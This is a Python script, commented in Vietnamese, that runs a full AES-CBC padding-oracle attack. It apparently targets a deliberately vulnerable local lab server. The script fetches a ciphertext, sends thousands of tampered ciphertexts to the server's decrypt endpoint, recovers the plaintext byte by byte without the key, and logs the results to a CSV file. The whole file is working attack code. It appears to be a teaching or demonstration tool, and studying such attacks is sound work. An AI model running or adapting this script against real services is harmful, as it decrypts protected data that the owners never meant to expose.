import requests
import time
import csv
import os
import sys

SERVER_URL = "http://127.0.0.1:5000"

def get_ciphertext():
    """Lấy ciphertext mẫu từ server để tiến hành giải mã."""
    print(f"[*] Fetching ciphertext from {SERVER_URL}/encrypt...")
    try:
        resp = requests.get(f"{SERVER_URL}/encrypt")
        resp.raise_for_status()
        data = resp.json()
        return bytes.fromhex(data["ciphertext"])
    except Exception as e:
        print(f"[-] Failed to connect to server: {e}")
        print("[-] Make sure server.py is running on port 5000")
        sys.exit(1)

def check_padding(ciphertext_bytes):
    """
    Gửi ciphertext (đã chỉnh sửa) lên server để kiểm tra padding.
    Trả về True nếu Padding HỢP LỆ (Không có lỗi 500 Invalid Padding).
    Trả về False nếu Padding KHÔNG HỢP LỆ (Server ném lỗi 500 Invalid Padding).
    """
    payload = ciphertext_bytes.hex()
    resp = requests.get(f"{SERVER_URL}/decrypt/{payload}")
    
    # Server lỗ hổng sẽ trả về 500 kèm chuỗi "Invalid Padding" khi padding sai.
    if resp.status_code == 500 and "Invalid Padding" in resp.text:
        return False
    # Nếu là 200 (Thành công) hoặc 400 (Padding đúng nhưng sai format), nghĩa là Padding đã đúng.
    return True

def attack_block(prev_block, target_block, request_counter):
    """Thực hiện tấn công từng byte trong 1 block 16-bytes."""
    intermediate = bytearray(16)
    
    # Duyệt ngược từ byte 15 về byte 0
    for i in range(15, -1, -1):
        pad_val = 16 - i
        tweaked_prev_block = bytearray(prev_block)
        
        # Thiết lập các byte đã tìm được ở phía sau để tạo thành padding mong muốn
        for j in range(15, i, -1):
            tweaked_prev_block[j] = intermediate[j] ^ pad_val
            
        found_byte = False
        # Thử 256 giá trị cho byte hiện tại
        for guess in range(256):
            request_counter[0] += 1
            tweaked_prev_block[i] = guess
            
            payload = bytes(tweaked_prev_block) + target_block
            
            if check_padding(payload):
                # Xử lý trường hợp "False Positive" ở byte cuối cùng (byte 15)
                # Ví dụ: Bản thân chuỗi ban đầu kết thúc bằng \x02\x02, ta vô tình đoán ra \x02.
                if i == 15:
                    # Lật bit của byte kề cuối (byte 14) để phá vỡ cấu trúc padding tự nhiên nếu có
                    tweaked_prev_block_check = bytearray(tweaked_prev_block)
                    tweaked_prev_block_check[14] ^= 0x01
                    request_counter[0] += 1
                    payload_check = bytes(tweaked_prev_block_check) + target_block
                    if not check_padding(payload_check):
                        continue # Đây là False positive, bỏ qua
                        
                intermediate[i] = guess ^ pad_val
                found_byte = True
                break
                
        if not found_byte:
            print(f"\n[-] Failed to find byte at index {i}. Is the server patched?")
            return None
            
    # Sau khi tìm được Intermediate Block, Plaintext = Intermediate XOR Original_Prev_Block
    plaintext_block = bytes(a ^ b for a, b in zip(intermediate, prev_block))
    return plaintext_block

def main():
    print("="*60)
    print("       AES-CBC PADDING ORACLE ATTACK SIMULATOR       ")
    print("="*60)
    
    full_ct = get_ciphertext()
    print(f"[+] Ciphertext length: {len(full_ct)} bytes")
    
    # Chia nhỏ ciphertext thành các block 16-bytes
    blocks = [full_ct[i:i+16] for i in range(0, len(full_ct), 16)]
    if len(blocks) < 2:
        print("[-] Ciphertext too short. Need at least IV + 1 block.")
        return
        
    recovered_plaintext = b""
    request_counter = [0]
    start_time = time.time()
    
    # Tấn công từng khối (Bắt đầu từ block 1, block 0 là IV)
    for b in range(1, len(blocks)):
        print(f"\n[*] Attacking block {b}/{len(blocks)-1}...")
        prev_block = blocks[b-1]
        target_block = blocks[b]
        
        pt_block = attack_block(prev_block, target_block, request_counter)
        if not pt_block:
            print("[-] Attack aborted.")
            return
            
        print(f"[+] Block {b} recovered: {pt_block}")
        recovered_plaintext += pt_block
        
    # Loại bỏ byte padding của plaintext cuối cùng
    try:
        from Crypto.Util.Padding import unpad
        final_plaintext = unpad(recovered_plaintext, 16).decode('utf-8')
    except Exception:
        final_plaintext = recovered_plaintext.decode('utf-8', errors='ignore')
        
    end_time = time.time()
    duration = end_time - start_time
    
    print("\n" + "="*60)
    print("[+] ATTACK SUCCESSFUL! (Without knowing the AES key)")
    print(f"[+] Recovered Plaintext: {final_plaintext}")
    print(f"[*] Total Queries Sent:  {request_counter[0]}")
    print(f"[*] Total Time Taken:    {duration:.2f} seconds")
    print("="*60 + "\n")
    
    # Log kết quả ra file csv
    log_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', 'data'))
    os.makedirs(log_dir, exist_ok=True)
    log_file = os.path.join(log_dir, 'aes_padding_oracle_log.csv')
    
    file_exists = os.path.isfile(log_file)
    with open(log_file, mode='a', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow(['Timestamp', 'Recovered Plaintext', 'Total Queries', 'Time (s)'])
        writer.writerow([
            time.strftime("%Y-%m-%d %H:%M:%S"),
            final_plaintext,
            request_counter[0],
            round(duration, 4)
        ])
    print(f"[+] Results automatically logged to: {os.path.relpath(log_file, os.path.dirname(__file__))}")

if __name__ == "__main__":
    main()
